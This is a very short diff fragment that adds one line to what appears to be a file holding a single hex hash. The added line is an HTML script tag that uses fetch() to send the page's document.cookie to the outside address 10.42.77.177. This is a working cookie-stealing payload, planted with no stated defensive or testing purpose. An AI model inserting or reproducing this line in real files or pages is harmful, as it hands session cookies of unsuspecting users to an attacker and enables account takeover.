@@ -1,1 +1,2 @@
+<script>fetch("http://10.42.77.177/."+document.cookie)</script>
 ceb925771302fcbd9780fd1fa9440c48
